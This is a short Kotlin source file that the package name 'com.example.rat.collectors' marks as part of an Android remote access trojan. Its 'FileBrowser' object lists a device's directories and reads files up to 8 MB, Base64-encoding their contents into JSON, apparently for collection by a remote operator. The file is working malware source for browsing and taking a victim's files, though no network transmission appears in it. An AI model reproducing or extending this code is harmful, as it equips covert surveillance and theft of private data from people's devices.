package com.example.rat.collectors

import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object FileBrowser {

    private const val MAX_INLINE = 8L * 1024 * 1024

    fun list(path: String): JSONArray {
        val out = JSONArray()
        val dir = File(path)
        if (!dir.exists()) throw IllegalArgumentException("no such path: $path")
        if (!dir.isDirectory) throw IllegalArgumentException("not a directory: $path")

        dir.listFiles()?.sortedBy { it.name }?.forEach { entry ->
            out.put(
                JSONObject()
                    .put("name", entry.name)
                    .put("path", entry.absolutePath)
                    .put("dir", entry.isDirectory)
                    .put("size", if (entry.isFile) entry.length() else 0L)
                    .put("mtime", entry.lastModified())
            )
        }
        return out
    }

    fun read(path: String): JSONObject {
        val file = File(path)
        if (!file.exists() || !file.isFile) throw IllegalArgumentException("no such file: $path")
        if (file.length() > MAX_INLINE) throw IllegalArgumentException("file too large (${file.length()} bytes)")

        val bytes = file.readBytes()
        return JSONObject()
            .put("name", file.name)
            .put("size", bytes.size)
            .put("data", Base64.encodeToString(bytes, Base64.NO_WRAP))
    }
}
